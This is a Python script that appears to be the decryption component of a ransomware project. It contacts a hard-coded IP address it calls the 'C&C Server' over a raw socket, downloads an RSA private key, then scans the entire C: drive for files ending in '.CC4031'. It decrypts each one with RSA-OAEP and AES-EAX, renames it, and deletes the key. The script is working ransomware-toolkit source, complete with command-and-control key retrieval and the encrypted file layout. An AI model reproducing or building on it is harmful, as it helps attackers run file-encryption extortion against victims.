import os
import socket
from Crypto.PublicKey   import RSA
from Crypto.Cipher      import PKCS1_OAEP, AES


IP_ADDRESS  = '25.6.175.231'
PORT        = 5678

def get_private_key():
    print('Creating socket...')
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        print('Connecting to C&C Server...')
        s.connect((IP_ADDRESS, PORT))

        s.send('private_key required!'.encode())
        print('Retrieving private_key.pem...')
        private_key = s.recv(2048)

        with open('private_key.pem', 'wb') as private_key_file:
            private_key_file.write(private_key)
        s.close()
    print('Done Retrieving: private_key.pem')

def get_file_paths(encrypted_extensions):
    file_paths = []
    for root, _, files in os.walk('C:\\'):
        for file in files:
            _, file_extension = os.path.splitext(root+'\\'+file)
            if file_extension in encrypted_extensions:
                file_paths.append(root+'\\'+file)
    print('Done Getting File Paths')
    return file_paths

def decrypt(file_path, private_key_file):
    with open(private_key_file, 'rb') as pk_file:
        key = RSA.import_key(pk_file.read())

    with open(file_path, 'rb') as file:
        encrypted_session_key, nonce, tag, ciphertext = [ file.read(x) for x in (key.size_in_bytes(), 16, 16, -1) ]

    cipher = PKCS1_OAEP.new(key)
    session_key = cipher.decrypt(encrypted_session_key)

    cipher = AES.new(session_key, AES.MODE_EAX, nonce)
    data = cipher.decrypt_and_verify(ciphertext, tag)

    with open(file_path, 'wb') as file:
        file.write(data)

    file_name, _ = os.path.splitext(file_path)
    os.rename(file_path, file_name + '.txt')
    
    print('Done Decpyting: ' + file_path)

get_private_key()
print('\n')
encrypted_extensions = ('.CC4031',)
file_paths = get_file_paths(encrypted_extensions)
print(len(file_paths))
print('\n')
for file_path in file_paths:
    decrypt(file_path, 'private_key.pem')
print('\n')
os.remove('private_key.pem')